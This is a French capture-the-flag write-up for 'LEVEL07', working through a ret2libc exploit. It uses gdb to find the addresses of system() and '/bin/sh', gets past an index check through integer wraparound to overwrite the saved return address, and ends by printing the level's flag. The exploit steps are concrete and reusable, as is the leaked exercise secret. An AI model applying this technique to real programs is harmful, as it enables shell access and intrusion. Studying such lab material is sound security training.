# LEVEL07

## Faille

Nous avons un programme nous permettant d'exécuter trois commandes : 
- store (index, value)
- read (index)
- quit

Nous remarquons que l'index ne peut pas être un multiple de `3`.

___
## Tests

On veut faire un **return to libc**, nous avons besoin des adresses de `system()` et de **"/bin/sh"**. 

Pour `system` on utilise :

```
(gdb) p system
$20 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

Pour **"/bin/sh"** on utilise :

```
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
```

Nous mettons un breakpoint à `main+718` (juste avant le dernier `ret`) pour pouvoir identifier la sauvegarde de l'`EIP`.

```
(gdb) info registers

eax            0x0	0
ecx            0xffffd600	-10752
edx            0xffffd600	-10752
ebx            0xf7fceff4	-134418444
esp            0xffffd6ec	0xffffd6ec
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x80489f1	0x80489f1 <main+718>
eflags         0x246	[ PF ZF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

`ESP` correspond à l’adresse de notre sauvegarde de l'`EIP`

	eip = 0xffffd6ec

On stocke la valeur `1` à l'index `1`.

On va ensuite chercher notre valeur en mémoire dans le but de localiser notre buffer en mémoire.

Nous mettons un breakpoint à `*main+638` pour être entre chacune des commandes executées par le programme (store, read, quit).

L'index `1` est stocké à `0xffffd528` donc 

	0xffffd528 - 4 = 0xffffd524

`0xffffd524` correspond à l'adresse du buffer.
 
	0xffffd6ec(EIP) - 0xffffd524(buff) = 456

Notre index offset est de `456`.

Dans le code, les adresses sont multipliées par `4`, on divise donc notre valeur par `4`.

	456 / 4 = 114

`114` étant divisible par `3` on ne peut pas l’utiliser.

Nous prenons la plus grande adresse de la stack (`0xffffffff`) que nous divisions par `4` pour correspondre à l'indexage des valeurs dans notre programme.

	ffffffff(4294967295 + 1) / 4 = 1073741824 

On a un "adressage circulaire", la valeur à l'index `-1` équivaut à `1073741824 - 1`.

Notre valeur stocké à l'index `1` l'est donc aussi à l'index `1073741825`

	1073741824 + 1 = 1073741825 (correspond à index 1)
	1073741824 + 2 = 1073741826 (correspond à index 2)


On peut exécuter la commande `store` à l’index 1 et ensuite `read` avec l'index `1073741825` ou `1` pour pointer sur la même valeur.

	1073741824 + 114 = 1073741938
	
`1073741938` n’est pas divisible par 3. Nous pouvons donc utiliser cette valeur.


## Solution

Nous avons :
- index sEIP = `1073741938`
- system = `0xf7e6aed0` = `4159090384`
- /bin/sh = `0xf7f897ec` = `4160264172`

On stocke donc `4160264172` à l'index 116 et `4159090384` à l'index `1073741938`. On quitte avec la commande `quit` et nous sommes dans le shell de notre `ret2libc`.

>> 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
